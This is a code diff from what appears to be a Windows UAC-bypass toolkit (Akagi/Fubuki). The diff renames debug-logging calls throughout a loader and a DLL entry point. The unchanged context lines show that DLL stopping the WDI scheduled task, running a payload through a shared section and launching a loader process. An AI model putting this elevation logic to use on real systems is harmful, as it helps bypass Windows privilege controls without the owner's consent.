@@ -214,7 +214,7 @@ ULONG pcaStopWDI()
     HRESULT hr;
     NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
 
-    ucmDbgMsg(L"[PCALDR] pcaStopWDI\r\n");
+    ucmLogDbgMsg(L"[PCALDR] pcaStopWDI\r\n");
 
     hr = CoInitializeEx(NULL,
         COINIT_APARTMENTTHREADED |
@@ -229,7 +229,7 @@ ULONG pcaStopWDI()
             TEXT("Microsoft\\Windows\\WDI"),
             TEXT("ResolutionHost")))
         {
-            ucmDbgMsg(L"[PCALDR] ucmxStopTaskByName success\r\n");
+            ucmLogDbgMsg(L"[PCALDR] ucmxStopTaskByName success\r\n");
             ntStatus = STATUS_SUCCESS;
         }
 
@@ -290,7 +290,7 @@ VOID WINAPI pcaEntryPointLoader(
         }
     }
     else {
-        ucmDbgMsg(L"[PCALDR] Empty command line\r\n");
+        ucmLogDbgMsg(L"[PCALDR] Empty command line\r\n");
     }
 
     RtlExitUserProcess(status);
@@ -343,7 +343,7 @@ BOOL WINAPI pcaEntryPointDll(
 
         LdrDisableThreadCalloutsForDll(hinstDLL);
 
-        ucmDbgMsg(L"[PCADLL] Entry\r\n");
+        ucmLogDbgMsg(L"[PCADLL] Entry\r\n");
 
         RtlSecureZeroMemory(&szName, sizeof(szName));
         ucmGenerateSharedObjectName(FUBUKI_PCA_SECTION_ID, szName);
@@ -377,7 +377,7 @@ BOOL WINAPI pcaEntryPointDll(
                 RtlSecureZeroMemory(&szLoader, sizeof(szLoader));
                 _strncpy(szLoader, MAX_PATH, pvLoaderBlock->szLoader, MAX_PATH);
 
-                ucmDbgMsg(L"[PCADLL] NtMapViewOfSection success\r\n");
+                ucmLogDbgMsg(L"[PCADLL] NtMapViewOfSection success\r\n");
 
                 RtlSecureZeroMemory(&szName, sizeof(szName));
                 _strcpy(szObjectName, L"\\BaseNamedObjects\\");
@@ -395,12 +395,12 @@ BOOL WINAPI pcaEntryPointDll(
                     RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
                     bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
                     if (bSharedParamsReadOk) {
-                        ucmDbgMsg(L"[PCADLL] Shared parameters read OK\r\n");
+                        ucmLogDbgMsg(L"[PCADLL] Shared parameters read OK\r\n");
                         lpParameter = g_SharedParams.szParameter;
                         cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
                     }
                     else {
-                        ucmDbgMsg(L"[PCADLL] Shared parameters defaulted\r\n");
+                        ucmLogDbgMsg(L"[PCADLL] Shared parameters defaulted\r\n");
                         lpParameter = NULL;
                         cbParameter = 0UL;
                     }
@@ -414,11 +414,11 @@ BOOL WINAPI pcaEntryPointDll(
                     // Run payload.
                     //
                     if (ucmLaunchPayload(lpParameter, cbParameter)) {
-                        ucmDbgMsg(L"[PCADLL] Payload executed OK\r\n");
+                        ucmLogDbgMsg(L"[PCADLL] Payload executed OK\r\n");
                         pvLoaderBlock->OpResult = FUBUKI_PCA_PAYLOAD_RUN;
                     }
                     else {
-                        ucmDbgMsg(L"[PCADLL] Error during payload execution\r\n");
+                        ucmLogDbgMsg(L"[PCADLL] Error during payload execution\r\n");
                     }
 
                     //
@@ -446,19 +446,19 @@ BOOL WINAPI pcaEntryPointDll(
                         &startupInfo,
                         &processInfo))
                     {
-                        ucmDbgMsg(L"[PCADLL] Loader run OK\r\n");
+                        ucmLogDbgMsg(L"[PCADLL] Loader run OK\r\n");
 
                         CloseHandle(processInfo.hThread);
                         CloseHandle(processInfo.hProcess);
                         pvLoaderBlock->OpResult |= FUBUKI_PCA_LOADER_RUN;
                     }
                     else {
-                        ucmDbgMsg(L"[PCADLL] Error during loader execution\r\n");
+                        ucmLogDbgMsg(L"[PCADLL] Error during loader execution\r\n");
                     }
 
                     NtSetEvent(hSharedEvent, NULL);
                     NtClose(hSharedEvent);
-                    ucmDbgMsg(L"[PCADLL] Shared event signaled\r\n");
+                    ucmLogDbgMsg(L"[PCADLL] Shared event signaled\r\n");
 
                     //
                     // Notify Akagi.
@@ -469,21 +469,21 @@ BOOL WINAPI pcaEntryPointDll(
 
                 }
                 else {
-                    ucmDbgMsg(L"[PCADLL] NtOpenEvent failed\r\n");
+                    ucmLogDbgMsg(L"[PCADLL] NtOpenEvent failed\r\n");
                 }
 
                 NtUnmapViewOfSection(NtCurrentProcess(), pvLoaderBlock);
 
             }
             else {
-                ucmDbgMsg(L"[PCADLL] MapViewOfFile failed\r\n");
+                ucmLogDbgMsg(L"[PCADLL] MapViewOfFile failed\r\n");
             }
 
             NtClose(hSharedSection);
 
         }
         else {
-            ucmDbgMsg(L"[PCADLL] OpenFileMapping failed\r\n");
+            ucmLogDbgMsg(L"[PCADLL] OpenFileMapping failed\r\n");
         }
 
     }
